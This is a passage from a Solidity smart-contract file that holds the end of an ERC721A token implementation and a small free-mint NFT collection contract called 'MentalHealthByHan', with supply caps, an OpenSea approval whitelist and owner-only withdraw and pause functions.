1062      * Requirements:
1063      *
1064      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1065      * - `quantity` must be greater than 0.
1066      *
1067      * Emits a {Transfer} event.
1068      */
1069     function _safeMint(
1070         address to,
1071         uint256 quantity,
1072         bytes memory _data
1073     ) internal {
1074         _mint(to, quantity, _data, true);
1075     }
1076 
1077     /**
1078      * @dev Mints `quantity` tokens and transfers them to `to`.
1079      *
1080      * Requirements:
1081      *
1082      * - `to` cannot be the zero address.
1083      * - `quantity` must be greater than 0.
1084      *
1085      * Emits a {Transfer} event.
1086      */
1087     function _mint(
1088         address to,
1089         uint256 quantity,
1090         bytes memory _data,
1091         bool safe
1092     ) internal {
1093         uint256 startTokenId = _currentIndex;
1094         if (to == address(0)) revert MintToZeroAddress();
1095         if (quantity == 0) revert MintZeroQuantity();
1096 
1097         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1098 
1099         // Overflows are incredibly unrealistic.
1100         // balance or numberMinted overflow if current value of either + quantity > 1.8e19 (2**64) - 1
1101         // updatedIndex overflows if _currentIndex + quantity > 1.2e77 (2**256) - 1
1102         unchecked {
1103             _addressData[to].balance += uint64(quantity);
1104             _addressData[to].numberMinted += uint64(quantity);
1105 
1106             _ownerships[startTokenId].addr = to;
1107             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1108 
1109             uint256 updatedIndex = startTokenId;
1110             uint256 end = updatedIndex + quantity;
1111 
1112             if (safe && to.isContract()) {
1113                 do {
1114                     emit Transfer(address(0), to, updatedIndex);
1115                     if (!_checkContractOnERC721Received(address(0), to, updatedIndex++, _data)) {
1116                         revert TransferToNonERC721ReceiverImplementer();
1117                     }
1118                 } while (updatedIndex != end);
1119                 // Reentrancy protection
1120                 if (_currentIndex != startTokenId) revert();
1121             } else {
1122                 do {
1123                     emit Transfer(address(0), to, updatedIndex++);
1124                 } while (updatedIndex != end);
1125             }
1126             _currentIndex = updatedIndex;
1127         }
1128         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1129     }
1130 
1131     /**
1132      * @dev Transfers `tokenId` from `from` to `to`.
1133      *
1134      * Requirements:
1135      *
1136      * - `to` cannot be the zero address.
1137      * - `tokenId` token must be owned by `from`.
1138      *
1139      * Emits a {Transfer} event.
1140      */
1141     function _transfer(
1142         address from,
1143         address to,
1144         uint256 tokenId
1145     ) private {
1146         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1147 
1148         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1149             isApprovedForAll(prevOwnership.addr, _msgSender()) ||
1150             getApproved(tokenId) == _msgSender());
1151 
1152         if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
1153         if (prevOwnership.addr != from) revert TransferFromIncorrectOwner();
1154         if (to == address(0)) revert TransferToZeroAddress();
1155 
1156         _beforeTokenTransfers(from, to, tokenId, 1);
1157 
1158         // Clear approvals from the previous owner
1159         _approve(address(0), tokenId, prevOwnership.addr);
1160 
1161         // Underflow of the sender's balance is impossible because we check for
1162         // ownership above and the recipient's balance can't realistically overflow.
1163         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1164         unchecked {
1165             _addressData[from].balance -= 1;
1166             _addressData[to].balance += 1;
1167 
1168             _ownerships[tokenId].addr = to;
1169             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1170 
1171             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1172             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1173             uint256 nextTokenId = tokenId + 1;
1174             if (_ownerships[nextTokenId].addr == address(0)) {
1175                 // This will suffice for checking _exists(nextTokenId),
1176                 // as a burned slot cannot contain the zero address.
1177                 if (nextTokenId < _currentIndex) {
1178                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1179                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1180                 }
1181             }
1182         }
1183 
1184         emit Transfer(from, to, tokenId);
1185         _afterTokenTransfers(from, to, tokenId, 1);
1186     }
1187 
1188     /**
1189      * @dev Destroys `tokenId`.
1190      * The approval is cleared when the token is burned.
1191      *
1192      * Requirements:
1193      *
1194      * - `tokenId` must exist.
1195      *
1196      * Emits a {Transfer} event.
1197      */
1198     function _burn(uint256 tokenId) internal virtual {
1199         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1200 
1201         _beforeTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1202 
1203         // Clear approvals from the previous owner
1204         _approve(address(0), tokenId, prevOwnership.addr);
1205 
1206         // Underflow of the sender's balance is impossible because we check for
1207         // ownership above and the recipient's balance can't realistically overflow.
1208         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1209         unchecked {
1210             _addressData[prevOwnership.addr].balance -= 1;
1211             _addressData[prevOwnership.addr].numberBurned += 1;
1212 
1213             // Keep track of who burned the token, and the timestamp of burning.
1214             _ownerships[tokenId].addr = prevOwnership.addr;
1215             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1216             _ownerships[tokenId].burned = true;
1217 
1218             // If the ownership slot of tokenId+1 is not explicitly set, that means the burn initiator owns it.
1219             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1220             uint256 nextTokenId = tokenId + 1;
1221             if (_ownerships[nextTokenId].addr == address(0)) {
1222                 // This will suffice for checking _exists(nextTokenId),
1223                 // as a burned slot cannot contain the zero address.
1224                 if (nextTokenId < _currentIndex) {
1225                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1226                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1227                 }
1228             }
1229         }
1230 
1231         emit Transfer(prevOwnership.addr, address(0), tokenId);
1232         _afterTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1233 
1234         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1235         unchecked {
1236             _burnCounter++;
1237         }
1238     }
1239 
1240     /**
1241      * @dev Approve `to` to operate on `tokenId`
1242      *
1243      * Emits a {Approval} event.
1244      */
1245     function _approve(
1246         address to,
1247         uint256 tokenId,
1248         address owner
1249     ) private {
1250         _tokenApprovals[tokenId] = to;
1251         emit Approval(owner, to, tokenId);
1252     }
1253 
1254     /**
1255      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1256      *
1257      * @param from address representing the previous owner of the given token ID
1258      * @param to target address that will receive the tokens
1259      * @param tokenId uint256 ID of the token to be transferred
1260      * @param _data bytes optional data to send along with the call
1261      * @return bool whether the call correctly returned the expected magic value
1262      */
1263     function _checkContractOnERC721Received(
1264         address from,
1265         address to,
1266         uint256 tokenId,
1267         bytes memory _data
1268     ) private returns (bool) {
1269         try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1270             return retval == IERC721Receiver(to).onERC721Received.selector;
1271         } catch (bytes memory reason) {
1272             if (reason.length == 0) {
1273                 revert TransferToNonERC721ReceiverImplementer();
1274             } else {
1275                 assembly {
1276                     revert(add(32, reason), mload(reason))
1277                 }
1278             }
1279         }
1280     }
1281 
1282     /**
1283      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1284      * And also called before burning one token.
1285      *
1286      * startTokenId - the first token id to be transferred
1287      * quantity - the amount to be transferred
1288      *
1289      * Calling conditions:
1290      *
1291      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1292      * transferred to `to`.
1293      * - When `from` is zero, `tokenId` will be minted for `to`.
1294      * - When `to` is zero, `tokenId` will be burned by `from`.
1295      * - `from` and `to` are never both zero.
1296      */
1297     function _beforeTokenTransfers(
1298         address from,
1299         address to,
1300         uint256 startTokenId,
1301         uint256 quantity
1302     ) internal virtual {}
1303 
1304     /**
1305      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1306      * minting.
1307      * And also called after one token has been burned.
1308      *
1309      * startTokenId - the first token id to be transferred
1310      * quantity - the amount to be transferred
1311      *
1312      * Calling conditions:
1313      *
1314      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
1315      * transferred to `to`.
1316      * - When `from` is zero, `tokenId` has been minted for `to`.
1317      * - When `to` is zero, `tokenId` has been burned by `from`.
1318      * - `from` and `to` are never both zero.
1319      */
1320     function _afterTokenTransfers(
1321         address from,
1322         address to,
1323         uint256 startTokenId,
1324         uint256 quantity
1325     ) internal virtual {}
1326 }
1327 
1328 
1329 
1330 contract MentalHealthByHan is ERC721A, Owneable {
1331 
1332     string public baseURI = "ipfs://QmUidy1jwfZneR5TmxUT5SotwXxdijtmEdwnJoNhNXvDxM/";
1333     string public constant baseExtension = ".json";
1334     address public constant proxyRegistryAddress = 0xa5409ec958C83C3f309868babACA7c86DCB077c1;
1335 
1336     uint256 public constant MAX_PER_TX_FREE = 1;
1337     uint256 public constant FREE_MAX_SUPPLY = 400;
1338     uint256 public constant MAX_PER_TX = 1;
1339     uint256 public constant MAX_SUPPLY = 400;
1340     uint256 public constant price = 0.0 ether;
1341 
1342     bool public paused = false;
1343 
1344     constructor() ERC721A("MentalHealthByHan", "MH") {}
1345 
1346     function mint(uint256 _amount) external payable {
1347         address _caller = _msgSender();
1348         require(!paused, "Paused");
1349         require(MAX_SUPPLY >= totalSupply() + _amount, "Exceeds max supply");
1350         require(_amount > 0, "No 0 mints");
1351         require(tx.origin == _caller, "No contracts");
1352         require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1353         
1354       if(FREE_MAX_SUPPLY >= totalSupply()){
1355             require(MAX_PER_TX_FREE >= _amount , "Excess max per free tx");
1356         }else{
1357             require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1358             require(_amount * price == msg.value, "Invalid funds provided");
1359         }
1360 
1361 
1362         _safeMint(_caller, _amount);
1363     }
1364 
1365     function isApprovedForAll(address owner, address operator)
1366         override
1367         public
1368         view
1369         returns (bool)
1370     {
1371         // Whitelist OpenSea proxy contract for easy trading.
1372         ProxyRegistry proxyRegistry = ProxyRegistry(proxyRegistryAddress);
1373         if (address(proxyRegistry.proxies(owner)) == operator) {
1374             return true;
1375         }
1376 
1377         return super.isApprovedForAll(owner, operator);
1378     }
1379 
1380     function withdraw() external onlyOwner {
1381         uint256 balance = address(this).balance;
1382         (bool success, ) = _msgSender().call{value: balance}("");
1383         require(success, "Failed to send");
1384     }
1385 
1386     function setupOS() external onlyOwner {
1387         _safeMint(_msgSender(), 1);
1388     }
1389 
1390     function pause(bool _state) external onlyOwner {
1391         paused = _state;
1392     }
1393 
1394     function setBaseURI(string memory baseURI_) external onlyOwner {
1395         baseURI = baseURI_;
1396     }
1397 
1398     function tokenURI(uint256 _tokenId) public view override returns (string memory) {
1399         require(_exists(_tokenId), "Token does not exist.");
1400         return bytes(baseURI).length > 0 ? string(
1401             abi.encodePacked(
1402               baseURI,
1403               Strings.toString(_tokenId),
1404               baseExtension
1405             )
1406         ) : "";
1407     }
1408 }
1409 
1410 contract OwnableDelegateProxy { }
1411 contract ProxyRegistry {
1412     mapping(address => OwnableDelegateProxy) public proxies;
1413 }